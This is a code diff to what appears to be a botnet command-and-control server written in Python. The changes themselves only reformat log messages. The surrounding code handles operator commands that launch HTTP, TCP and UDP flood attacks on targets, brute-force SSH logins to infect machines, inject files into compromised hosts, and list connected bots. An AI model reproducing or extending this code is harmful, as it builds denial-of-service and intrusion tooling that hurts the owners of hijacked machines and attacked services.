@@ -547,12 +547,12 @@ ________________________________________________________
                                 c.send(
                                     f"Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}")
+                                    f"\n[(SERVER)---->({hostname})]: Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}")
                             except:
                                 msg = "help"
                                 c.send("Invalid Parameters!".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Invalid Parameters!")
+                                    f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
                         elif msg.startswith('!tcpflood'):
                             msgtobot = msg.split()
                             try:
@@ -563,12 +563,12 @@ ________________________________________________________
                                 c.send(
                                     f"Successfully started a TCP Flood Attack on {target}".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Successfully started a TCP Flood Attack on {target}")
+                                    f"\n[(SERVER)---->({hostname})]: Successfully started a TCP Flood Attack on {target}")
                             except:
                                 msg = "help"
                                 c.send("Invalid Parameters!".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Invalid Parameters!")
+                                    f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
                         elif msg.startswith('!udpflood'):
                             msgtobot = msg.split()
                             try:
@@ -579,12 +579,12 @@ ________________________________________________________
                                 c.send(
                                     f"Successfully started a UDP Flood Attack on {target}".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Successfully started a UDP Flood Attack on {target}")
+                                    f"\n[(SERVER)---->({hostname})]: Successfully started a UDP Flood Attack on {target}")
                             except:
                                 msg = "help"
                                 c.send("Invalid Parameters!".encode())
                                 self.log(
-                                    f"[(SERVER)---->({hostname})]: Invalid Parameters!")
+                                    f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
                         elif msg.startswith('!help'):
                             c.send(self.welcomemsg.encode())
                         elif msg.startswith("!infect"):
@@ -596,7 +596,7 @@ ________________________________________________________
                                 bruteforcer.start()
                             else:
                                 c.send("[(SERVER)]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!".encode())
-                                self.log(f"[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
+                                self.log(f"\n[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
                         elif msg.startswith("!sshlogin"):
                             msg_split = msg.split()
                             ip = msg_split[1]
@@ -606,7 +606,7 @@ ________________________________________________________
                             login.start()
                         elif msg.startswith("!getconninfo"):
                             c.send(self.gen_conntable().encode())
-                            self.log(f"[(SERVER)---->({hostname})]:\n{self.gen_conntable()}")
+                            self.log(f"\n[(SERVER)---->({hostname})]:\n{self.gen_conntable()}")
                         elif msg.startswith("!inject"):
                             msg_split = msg.split()
                             file = msg_split[1]
@@ -614,7 +614,7 @@ ________________________________________________________
                                 self.ssh_inject(bot, file)
                         elif msg.startswith("!listsshbots"):
                             c.send(f"[(SERVER)]: Connected SSH Bots: {self.display_bots}".encode())
-                            self.log(f"[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
+                            self.log(f"\n[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
                         if "!login" in msg and "!help" in msg or "!getconninfo" in msg or "!getconninfo" in msg:
                             pass
                         else:
@@ -964,7 +964,7 @@ ________________________________________________________
                                 conn.send(self.instruction.encode())
                         except:
                             self.log(f"\n[(ERROR)]: Unable to send message to {conn}.")
-                    self.log(f"\n[(SERVER)]: {self.instruction}")
+                self.log(f"\n[(SERVER)]: {self.instruction}")
             except Exception as e:
                 self.log(f"\n[(ERROR)]: {str(e)}")
     def gen_admin(self):
